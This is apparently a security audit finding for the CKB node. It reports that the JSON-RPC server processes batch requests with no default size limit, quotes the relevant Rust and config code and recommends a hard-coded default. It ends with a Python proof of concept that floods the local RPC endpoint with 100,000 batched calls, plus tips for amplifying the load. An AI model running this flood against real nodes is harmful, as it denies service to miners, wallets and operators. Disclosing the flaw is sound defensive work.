### Title
Unbounded JSON-RPC Batch Request Causes RPC Server Resource Exhaustion (DoS) — (`File: rpc/src/server.rs`)

---

### Summary

The CKB JSON-RPC server processes batch requests with no enforced default limit on the number of calls per batch. The `rpc_batch_limit` guard is opt-in and disabled by default in the shipped configuration. An unprivileged RPC caller can send a single oversized batch request that forces the server to execute thousands of sequential RPC calls, exhausting CPU and memory and rendering the node's RPC interface unresponsive.

---

### Finding Description

In `rpc/src/server.rs`, the `handle_jsonrpc` function dispatches JSON-RPC batch requests:

```rust
Request::Batch(calls) => {
    if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
        && calls.len() > *batch_size
    {
        return make_error_response(...);
    }

    let stream = stream::iter(calls)
        .then(move |call| {
            let io = Arc::clone(&io);
            async move { io.handle_call(call, T::default()).await }
        })
        .filter_map(|response| async move { response });
    ...
}
``` [1](#0-0) 

`JSONRPC_BATCH_LIMIT` is a `OnceLock<usize>` that is only initialized when `config.rpc_batch_limit` is `Some(...)`:

```rust
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
``` [2](#0-1) 

The field `rpc_batch_limit` is typed `Option<usize>` with no `#[serde(default)]` forcing a value: [3](#0-2) 

The shipped default configuration explicitly leaves this option commented out:

```toml
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
``` [4](#0-3) 

When `rpc_batch_limit` is absent from the config, `JSONRPC_BATCH_LIMIT.get()` returns `None`, the `if let Some(batch_size)` guard is never entered, and the batch is processed with no upper bound. The calls are dispatched **sequentially** via `.then()` — each call must complete before the next begins. The only constraint is `max_request_body_size = 10 MiB`. [5](#0-4) 

A minimal JSON-RPC call body is approximately 50–80 bytes. Within the 10 MiB body limit an attacker can pack roughly **130,000–200,000** calls into a single HTTP POST. Each call invokes a real handler (e.g., `get_transaction`, `get_block`, `get_block_template`) that performs database lookups or lock acquisitions. The 30-second `TimeoutLayer` applies to the entire request, but multiple concurrent oversized batches can saturate the Tokio thread pool and exhaust heap memory before the timeout fires. [6](#0-5) 

---

### Impact Explanation

- The RPC server becomes unresponsive to all legitimate callers (miners, wallets, monitoring tools).
- Sustained concurrent batch floods can cause OOM termination of the node process.
- Block template retrieval (`get_block_template`) and transaction submission (`send_transaction`) are blocked, halting mining and transaction propagation for the duration of the attack.
- No chain state is corrupted, but availability of the node's control plane is fully denied.

---

### Likelihood Explanation

The RPC endpoint defaults to `127.0.0.1:8114`. The scope explicitly recognises "RPC caller" and "miner/block-template caller" as valid unprivileged attacker roles. Any local process — a compromised application, a malicious dependency, a script run by the node operator — can reach the endpoint without credentials. The attack requires a single HTTP POST with a crafted JSON array body; no special protocol knowledge beyond the JSON-RPC 2.0 batch specification is needed. The default configuration ships with the protection disabled and the comment itself acknowledges the risk, making exploitation straightforward for any local attacker.

---

### Recommendation

Set a safe hard-coded default for `JSONRPC_BATCH_LIMIT` (e.g., 2000) that is applied even when `rpc_batch_limit` is absent from the configuration, rather than leaving the limit opt-in. The initialization in `RpcServer::new` should fall back to a constant:

```rust
let limit = config.rpc_batch_limit.unwrap_or(DEFAULT_BATCH_LIMIT);
let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| limit);
```

Additionally, consider processing batch calls with bounded concurrency rather than purely sequentially, so that a single slow call does not block the entire batch response stream.

---

### Proof of Concept

```python
import json, requests

# Craft a batch of 100,000 cheap but real RPC calls
batch = [
    {"jsonrpc": "2.0", "method": "get_tip_block_number", "params": [], "id": i}
    for i in range(100_000)
]
payload = json.dumps(batch)
# payload size ~5.5 MiB — within the 10 MiB max_request_body_size limit

resp = requests.post(
    "http://127.0.0.1:8114",
    data=payload,
    headers={"Content-Type": "application/json"},
    timeout=120,
)
# The node's Tokio runtime is now saturated processing 100,000 sequential
# handler invocations. Concurrent legitimate RPC calls will time out or
# queue indefinitely until this batch completes or the process OOMs.
print(resp.status_code)
```

The attack is repeatable with concurrent connections to multiply the load. Substituting `get_block_template` (which acquires the tx-pool read lock) for `get_tip_block_number` amplifies the impact by contending on shared locks, further degrading mining throughput.

### Citations

**File:** rpc/src/server.rs (L53-55)
```rust
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L125-128)
```rust
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** util/app-config/src/configs/rpc.rs (L43-44)
```rust
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
```

**File:** resource/ckb.toml (L186-187)
```text
# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```
